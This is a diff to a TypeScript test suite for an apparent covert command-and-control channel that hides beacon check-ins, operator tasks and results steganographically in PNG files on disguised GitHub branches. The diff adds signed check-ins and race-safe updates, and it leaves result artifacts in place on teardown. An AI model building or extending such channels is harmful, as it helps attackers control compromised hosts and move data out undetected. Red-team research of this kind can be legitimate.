@@ -14,7 +14,7 @@ const mockGit = {
 };
 
 const mockRepos = {
-  get:        mock(async () => ({})),
+  get:        mock(async () => ({ data: { default_branch: "trunk" } })),
   getContent: mock(async () => ({ data: { type: "file", content: "" } })),
 };
 
@@ -34,6 +34,7 @@ import { StegoCodec } from "../lib/StegoCodec.ts";
 import { encodePng, decodePng, makePixelBuffer } from "../lib/PngEncoder.ts";
 import { generateKeyPair, bytesToBase64, encryptBox } from "../crypto/sodium.ts";
 import type { BeaconConfig } from "../types.ts";
+import { signedCheckin } from "./signedCheckinFixture.ts";
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 
@@ -151,17 +152,17 @@ describe("SteganographyTentacle", () => {
 
   // ── isAvailable ──────────────────────────────────────────────────────────────
 
-  it("isAvailable() returns true when git.getRef resolves successfully", async () => {
+  it("isAvailable() checks the repository's actual default branch", async () => {
     mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "sha1" } } });
     const t = new SteganographyTentacle(await makeConfig());
     expect(await t.isAvailable()).toBe(true);
     expect(mockGit.getRef).toHaveBeenCalledTimes(1);
     const call = (mockGit.getRef as any).mock.calls[0][0];
-    expect(call.ref).toBe("heads/infra-cache-abcd1234");
+    expect(call.ref).toBe("heads/trunk");
   });
 
-  it("isAvailable() returns false when git.getRef throws 404", async () => {
-    mockGit.getRef.mockRejectedValueOnce(
+  it("isAvailable() returns false when repository metadata is unavailable", async () => {
+    mockRepos.get.mockRejectedValueOnce(
       Object.assign(new Error("Not Found"), { status: 404 })
     );
     const t = new SteganographyTentacle(await makeConfig());
@@ -169,7 +170,7 @@ describe("SteganographyTentacle", () => {
   });
 
   it("isAvailable() returns false on other errors", async () => {
-    mockGit.getRef.mockRejectedValueOnce(
+    mockRepos.get.mockRejectedValueOnce(
       Object.assign(new Error("Forbidden"), { status: 403 })
     );
     const t = new SteganographyTentacle(await makeConfig());
@@ -194,7 +195,7 @@ describe("SteganographyTentacle", () => {
     );
 
     const t = new SteganographyTentacle(cfg);
-    const tasks = await t.checkin(PAYLOAD);
+    const tasks = await t.checkin(await signedCheckin(cfg, PAYLOAD));
 
     expect(tasks).toEqual([]);
     expect(mockGit.createBlob).toHaveBeenCalledTimes(1);
@@ -203,7 +204,7 @@ describe("SteganographyTentacle", () => {
     expect(createRefCall.ref).toBe("refs/heads/infra-cache-abcd1234");
   });
 
-  it("checkin() does not resend ACK on subsequent calls", async () => {
+  it("checkin() refreshes the ACK PNG on every call and still polls for tasks", async () => {
     const operatorKp = await generateKeyPair();
     const cfg = await makeConfig();
     const opPubB64 = await bytesToBase64(operatorKp.publicKey);
@@ -218,20 +219,108 @@ describe("SteganographyTentacle", () => {
     );
 
     const t = new SteganographyTentacle(cfg);
-    await t.checkin(PAYLOAD);
+    const firstPayload = await signedCheckin(cfg, {
+      ...PAYLOAD,
+      checkinAt: "2026-07-16T12:00:00.000Z",
+    });
+    await t.checkin(firstPayload);
     clearAllMocks();
     mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });
 
-    // Second call: no ACK, just poll
-    // Provide a new SHA so dedup check doesn't short-circuit before getContent
-    mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "new-sha-second-call" } } });
+    // Second call updates the existing ACK file, then polls with the new head.
+    mockGit.getRef
+      .mockResolvedValueOnce({ data: { object: { sha: "ack-head-second-call" } } })
+      .mockResolvedValueOnce({ data: { object: { sha: "poll-head-second-call" } } });
     mockRepos.getContent.mockRejectedValueOnce(
       Object.assign(new Error("Not Found"), { status: 404 })
     );
 
-    await t.checkin(PAYLOAD);
+    const secondPayload = await signedCheckin(cfg, {
+      ...PAYLOAD,
+      checkinAt: "2026-07-16T12:00:01.000Z",
+    });
+    await t.checkin(secondPayload);
     expect(mockGit.createRef).not.toHaveBeenCalled();
-    expect(mockGit.createBlob).not.toHaveBeenCalled();
+    expect(mockGit.createBlob).toHaveBeenCalledTimes(1);
+    expect(mockGit.updateRef).toHaveBeenCalledTimes(1);
+    expect(((mockGit.updateRef.mock.calls[0] as any)[0] as any).force).toBe(false);
+    expect(mockRepos.getContent).toHaveBeenCalledTimes(1);
+
+    const encodedPng = ((mockGit.createBlob.mock.calls[0] as any)[0] as any)
+      .content as string;
+    const binary = atob(encodedPng);
+    const png = Uint8Array.from(binary, (char) => char.charCodeAt(0));
+    const hidden = StegoCodec.decode(decodePng(png).pixels);
+    expect(hidden).not.toBeNull();
+    const written = JSON.parse(new TextDecoder().decode(hidden!));
+    expect(written.identity.sequence).toBe(secondPayload.identity!.sequence);
+    expect(written.identity.signature).not.toBe(
+      firstPayload.identity!.signature,
+    );
+  });
+
+  it("retries a conflicting ACK ref update from the latest branch head", async () => {
+    const operatorKp = await generateKeyPair();
+    const cfg = await makeConfig();
+    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
+    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });
+    mockGit.getRef
+      .mockResolvedValueOnce({ data: { object: { sha: "head-before-race" } } })
+      .mockResolvedValueOnce({ data: { object: { sha: "head-after-race" } } })
+      .mockResolvedValueOnce({ data: { object: { sha: "poll-head" } } });
+    mockGit.updateRef
+      .mockRejectedValueOnce(
+        Object.assign(new Error("not a fast forward"), { status: 422 }),
+      )
+      .mockResolvedValueOnce({});
+    mockRepos.getContent.mockRejectedValueOnce(
+      Object.assign(new Error("Not Found"), { status: 404 }),
+    );
+
+    const t = new SteganographyTentacle(cfg);
+    await t.checkin(await signedCheckin(cfg, PAYLOAD));
+
+    expect(mockGit.createBlob).toHaveBeenCalledTimes(1);
+    expect(mockGit.createCommit).toHaveBeenCalledTimes(2);
+    expect(
+      ((mockGit.createCommit.mock.calls[0] as any)[0] as any).parents,
+    ).toEqual(["head-before-race"]);
+    expect(
+      ((mockGit.createCommit.mock.calls[1] as any)[0] as any).parents,
+    ).toEqual(["head-after-race"]);
+    expect(mockGit.updateRef).toHaveBeenCalledTimes(2);
+    for (const call of mockGit.updateRef.mock.calls as any) {
+      expect(call[0].force).toBe(false);
+    }
+  });
+
+  it("retries a conflicting task deletion from the latest branch head", async () => {
+    const cfg = await makeConfig();
+    const t = new SteganographyTentacle(cfg);
+    mockGit.getRef
+      .mockResolvedValueOnce({ data: { object: { sha: "head-before-race" } } })
+      .mockResolvedValueOnce({ data: { object: { sha: "head-after-race" } } });
+    mockGit.updateRef
+      .mockRejectedValueOnce(
+        Object.assign(new Error("not a fast forward"), { status: 409 }),
+      )
+      .mockResolvedValueOnce({});
+
+    await (t as any).deleteFile(
+      `infra-${cfg.id.slice(0, 8)}-t.png`,
+    );
+
+    expect(mockGit.createCommit).toHaveBeenCalledTimes(2);
+    expect(
+      ((mockGit.createCommit.mock.calls[0] as any)[0] as any).parents,
+    ).toEqual(["head-before-race"]);
+    expect(
+      ((mockGit.createCommit.mock.calls[1] as any)[0] as any).parents,
+    ).toEqual(["head-after-race"]);
+    expect(mockGit.updateRef).toHaveBeenCalledTimes(2);
+    for (const call of mockGit.updateRef.mock.calls as any) {
+      expect(call[0].force).toBe(false);
+    }
   });
 
   // ── checkin — task polling ────────────────────────────────────────────────────
@@ -252,7 +341,7 @@ describe("SteganographyTentacle", () => {
     );
 
     const t = new SteganographyTentacle(cfg);
-    const tasks = await t.checkin(PAYLOAD);
+    const tasks = await t.checkin(await signedCheckin(cfg, PAYLOAD));
     expect(tasks).toEqual([]);
   });
 
@@ -279,7 +368,7 @@ describe("SteganographyTentacle", () => {
     mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "task-commit-sha" } } });
 
     const t = new SteganographyTentacle(cfg);
-    const tasks = await t.checkin({ ...PAYLOAD, beaconId: cfg.id });
+    const tasks = await t.checkin(await signedCheckin(cfg, PAYLOAD));
 
     expect(tasks).toHaveLength(1);
     expect(tasks[0]!.taskId).toBe("t1");
@@ -311,7 +400,7 @@ describe("SteganographyTentacle", () => {
     expect(mockGit.createBlob).toHaveBeenCalledTimes(1);
     expect(mockGit.createTree).toHaveBeenCalledTimes(1);
     const treeCall = (mockGit.createTree as any).mock.calls[0][0];
-    expect(treeCall.tree[0].path).toBe("infra-abcd1234-r.png");
+    expect(treeCall.tree[0].path).toBe("infra-abcd1234-r-taskid-1.png");
   });
 
   it("submitResult() resolves without throwing", async () => {
@@ -330,7 +419,34 @@ describe("SteganographyTentacle", () => {
         output:      "ok",
         completedAt: new Date().toISOString(),
       })
-    ).resolves.toBeUndefined();
+    ).resolves.toEqual({
+      artifactWritten: true,
+      controllerAccepted: false,
+      channel: "stego",
+      acceptance: null,
+    });
+  });
+
+  it("posted result artifacts survive teardown", async () => {
+    const cfg = await makeConfig();
+    const operatorKp = await generateKeyPair();
+    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
+    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });
+    mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "head-sha" } } });
+
+    const t = new SteganographyTentacle(cfg);
+    await t.submitResult({
+      taskId:      "persist1-result",
+      beaconId:    cfg.id,
+      success:     true,
+      output:      "awaiting collection",
+      completedAt: new Date().toISOString(),
+    });
+    await t.teardown();
+
+    const treeCall = (mockGit.createTree as any).mock.calls[0][0];
+    expect(treeCall.tree[0].path).toBe("infra-abcd1234-r-persist1.png");
+    expect(mockGit.deleteRef).not.toHaveBeenCalled();
   });
 
   // ── checkin() returns [] without throwing (basic guard) ──────────────────────
@@ -350,7 +466,7 @@ describe("SteganographyTentacle", () => {
     );
 
     const t = new SteganographyTentacle(cfg);
-    const tasks = await t.checkin(PAYLOAD);
+    const tasks = await t.checkin(await signedCheckin(cfg, PAYLOAD));
     expect(tasks).toEqual([]);
   });
 
@@ -383,19 +499,18 @@ describe("SteganographyTentacle", () => {
 
   // ── teardown ─────────────────────────────────────────────────────────────────
 
-  it("teardown() deletes the infra-cache branch ref", async () => {
+  it("teardown() releases local state without deleting the infra-cache branch ref", async () => {
     const t = new SteganographyTentacle(await makeConfig());
-    await t.teardown();
-    expect(mockGit.deleteRef).toHaveBeenCalledTimes(1);
-    const call = (mockGit.deleteRef as any).mock.calls[0][0];
-    expect(call.ref).toBe("heads/infra-cache-abcd1234");
-  });
+    const state = t as any;
+    state.lastTaskSha = "task-sha";
+    state.operatorPublicKey = new Uint8Array(32);
+    state.defaultBranch = "trunk";
 
-  it("teardown() does not throw when deleteRef fails", async () => {
-    mockGit.deleteRef.mockRejectedValueOnce(
-      Object.assign(new Error("Not Found"), { status: 404 })
-    );
-    const t = new SteganographyTentacle(await makeConfig());
-    await expect(t.teardown()).resolves.toBeUndefined();
+    await t.teardown();
+
+    expect(state.lastTaskSha).toBeNull();
+    expect(state.operatorPublicKey).toBeNull();
+    expect(state.defaultBranch).toBeNull();
+    expect(mockGit.deleteRef).not.toHaveBeenCalled();
   });
 });
